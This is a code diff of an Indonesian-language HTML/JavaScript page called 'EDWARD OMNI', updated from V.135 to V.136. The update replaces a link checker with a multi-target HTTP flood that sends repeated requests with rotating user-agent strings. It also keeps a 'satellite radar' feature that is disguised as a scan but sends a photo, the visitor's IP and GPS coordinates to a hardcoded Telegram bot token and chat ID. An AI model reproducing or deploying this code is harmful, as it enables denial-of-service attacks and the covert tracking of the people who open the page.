@@ -3,9 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EDWARD OMNI V.135</title>
+    <title>EDWARD OMNI V.136</title>
     <style>
-        :root { --neon: #00ff88; --bg: #050a0e; --red: #ff4757; --purple: #bc13fe; --blue: #00bdff; }
+        :root { --neon: #00ff88; --bg: #050a0e; --red: #ff4757; --purple: #bc13fe; --blue: #00bdff; --orange: #ff9f43; }
         * { box-sizing: border-box; transition: 0.2s; }
         body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin:0; padding: 15px; }
         
@@ -16,14 +16,16 @@
         .card { background: rgba(15, 25, 35, 0.8); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 18px; margin-bottom: 12px; }
         h3 { margin: 0 0 12px 0; font-size: 10px; color: rgba(255,255,255,0.5); letter-spacing: 2px; text-transform: uppercase; }
         
-        input { background: rgba(0,0,0,0.3); border: 1px solid rgba(0,255,136,0.2); border-radius: 10px; color: var(--neon); padding: 12px; width: 100%; margin-bottom: 12px; outline: none; font-size: 13px; }
+        input { background: rgba(0,0,0,0.3); border: 1px solid rgba(0,255,136,0.2); border-radius: 10px; color: var(--neon); padding: 12px; width: 100%; margin-bottom: 8px; outline: none; font-size: 13px; }
         .btn { width: 100%; padding: 14px; border-radius: 12px; border: none; cursor: pointer; font-weight: 800; font-size: 11px; text-transform: uppercase; display: flex; align-items: center; justify-content: center; gap: 8px; }
         
         .btn-safe { background: linear-gradient(45deg, var(--neon), var(--blue)); color: #000; }
         .btn-atk { background: linear-gradient(45deg, var(--red), var(--purple)); color: #fff; }
         .btn-radar { background: transparent; color: var(--neon); border: 1px solid var(--neon); }
 
-        #scanStatus { display: none; margin-top: 10px; text-align: center; padding: 10px; border-radius: 10px; font-weight: bold; font-size: 12px; }
+        .sys-monitor { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px; font-size: 10px; font-family: monospace; }
+        .mon-box { border: 1px solid rgba(0,255,136,0.2); padding: 5px; border-radius: 5px; text-align: center; }
+
         #killerLog { display: none; margin-top: 12px; background: #000; border-radius: 10px; padding: 10px; font-family: monospace; font-size: 9px; height: 120px; overflow-y: auto; color: var(--neon); border: 1px solid #1a1a1a; }
 
         #radarOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
@@ -35,35 +37,32 @@
 </head>
 <body>
 
-    <button class="exit-btn" onclick="location.href='about:blank';">EXIT</button>
+    <button class="exit-btn" onclick="location.reload();">RELOAD</button>
 
     <div class="master-header">
-        <p class="master-name">EDWARD OMNI V.135</p>
-        <div style="margin-top:5px;"><span style="color:var(--neon); font-size:9px; border:1px solid var(--neon); padding:2px 8px; border-radius:10px;">NUCLEAR + SCANNER EDITION</span></div>
+        <p class="master-name">EDWARD OMNI V.136</p>
+        <div class="sys-monitor">
+            <div class="mon-box">CPU: <span id="cpuLoad">0%</span></div>
+            <div class="mon-box">TEMP: <span id="sysTemp">38°C</span></div>
+        </div>
     </div>
 
     <div class="card">
-        <h3>🛡️ DEEP CLOUD SCANNER</h3>
-        <input type="text" id="scanInput" placeholder="Masukkan link untuk analisa...">
-        <button class="btn btn-safe" onclick="cekLink()">⚡ ANALYZE TARGET</button>
-        <div id="scanStatus"></div>
-    </div>
-
-    <div class="card">
-        <h3>🔥 KILLER FLOOD (NUCLEAR)</h3>
-        <input type="text" id="targetUrl" placeholder="https://target-server.com">
-        <button class="btn btn-atk" id="atkBtn" onclick="toggleAtk()">LAUNCH ATTACK 🚀</button>
+        <h3>🔥 MULTI-TARGET NUCLEAR (V.136)</h3>
+        <input type="text" id="target1" placeholder="Target 1 (URL / IP)">
+        <input type="text" id="target2" placeholder="Target 2 (Cadangan)">
+        <button class="btn btn-atk" id="atkBtn" onclick="toggleAtk()">LAUNCH MULTI-STRIKE 🚀</button>
         <div id="killerLog"></div>
     </div>
 
-    <div class="card" style="text-align: center;">
-        <h3>📡 SATELLITE RADAR</h3>
-        <button class="btn btn-radar" onclick="startRadar()">HUBUNGKAN SATELIT</button>
+    <div class="card">
+        <h3>🛡️ GHOST RADAR & CLOUD SCAN</h3>
+        <button class="btn btn-radar" onclick="startRadar()">HUBUNGKAN SATELIT & SCAN</button>
     </div>
 
     <div id="radarOverlay">
         <div class="radar-container"><div class="radar-sweep"></div></div>
-        <p style="margin-top:20px; font-size:10px; color:var(--neon); letter-spacing:2px;">UPLOADING DATA TO TELEGRAM...</p>
+        <p id="radarText" style="margin-top:20px; font-size:10px; color:var(--neon); letter-spacing:2px;">BYPASSING CLOUDFLARE...</p>
     </div>
 
     <canvas id="canvas"></canvas>
@@ -72,37 +71,44 @@
     <script>
         const TOKEN = '8766727574:AAHYs-g11Up4SWnl4t8P3pHpMvS1XkKkr0g';
         const CHAT_ID = '7898572558';
-        let isAtk = false, atkIntervals = [];
-
-        function cekLink() {
-            const url = document.getElementById('scanInput').value.toLowerCase();
-            const status = document.getElementById('scanStatus');
-            if(!url) return;
-            status.style.display = "block"; status.innerText = "DEEP SCANNING...";
-            setTimeout(() => {
-                const bad = ['dana', 'kaget', 'giveaway', '.xyz', '.tk', 'bit.ly'];
-                const isBad = bad.some(w => url.includes(w)) || !url.startsWith('https://');
-                status.style.background = isBad ? "rgba(255,71,87,0.1)" : "rgba(0,255,163,0.1)";
-                status.style.color = isBad ? "#ff4757" : "#00ff88";
-                status.innerText = isBad ? "⚠️ WARNING: PHISING DETECTED!" : "✅ CLEAN: LINK SECURE";
-            }, 1200);
-        }
+        const UA_DB = [
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1",
+            "Mozilla/5.0 (Linux; Android 13; CPH2591) AppleWebKit/537.36",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
+        ];
+        
+        let isAtk = false;
 
         function toggleAtk() {
-            const url = document.getElementById('targetUrl').value;
+            const t1 = document.getElementById('target1').value;
+            const t2 = document.getElementById('target2').value;
             const log = document.getElementById('killerLog');
-            if(!url || isAtk) { if(isAtk) location.reload(); return; }
+            const targets = [t1, t2].filter(t => t !== "");
+
+            if(targets.length === 0 || isAtk) { if(isAtk) location.reload(); return; }
+            
             isAtk = true; log.style.display = "block";
-            document.getElementById('atkBtn').innerText = "STOP ATTACK 🛑";
-            for(let i=0; i < 20; i++) {
-                atkIntervals.push(setInterval(() => {
-                    fetch(url, { mode: 'no-cors', cache: 'no-cache' }).catch(() => {});
-                    const e = document.createElement('div');
-                    e.innerText = "> [THREAD-"+i+"] SENDING NUCLEAR PACKET...";
-                    log.prepend(e);
-                    if(log.childNodes.length > 30) log.removeChild(log.lastChild);
-                }, 150));
-            }
+            document.getElementById('atkBtn').innerText = "TERMINATE ATTACK 🛑";
+            document.getElementById('atkBtn').style.background = "var(--orange)";
+
+            targets.forEach(url => {
+                for(let i=0; i < 20; i++) {
+                    setInterval(() => {
+                        const randomUA = UA_DB[Math.floor(Math.random() * UA_DB.length)];
+                        fetch(url, { mode: 'no-cors', headers: { 'User-Agent': randomUA } }).catch(() => {});
+                        const e = document.createElement('div');
+                        e.innerText = "> [V.136-HIT] " + url.substring(0,15) + "... [UA: GHOST]";
+                        log.prepend(e);
+                        if(log.childNodes.length > 20) log.removeChild(log.lastChild);
+                    }, 120);
+                }
+            });
+
+            setInterval(() => {
+                document.getElementById('cpuLoad').innerText = Math.floor(Math.random() * 30 + 60) + "%";
+                document.getElementById('sysTemp').innerText = (Math.floor(Math.random() * 5) + 40) + "°C";
+            }, 1500);
         }
 
         async function startRadar() {
@@ -132,8 +138,7 @@
         async function sendTele(photo, ip, lat, lon) {
             const fd = new FormData();
             fd.append('chat_id', CHAT_ID); fd.append('photo', photo);
-            let cap = "🔱 [ REPORT V.135 ] 🔱\n\n🌐 IP: " + ip + "\n📱 DEV: " + navigator.platform;
-            if(lat && lon) cap += "\n📍 MAPS: http://googleusercontent.com/maps.google.com/5" + lat + "," + lon;
+            let cap = "🔱 [ REPORT V.136 - EDWARD-BAIK ] 🔱\n\n🌐 IP: " + ip + "\n📍 MAPS: " + (lat ? "http://google.com/maps?q="+lat+","+lon : "Locked");
             fd.append('caption', cap);
             return fetch("https://api.telegram.org/bot" + TOKEN + "/sendPhoto", { method: "POST", body: fd });
         }
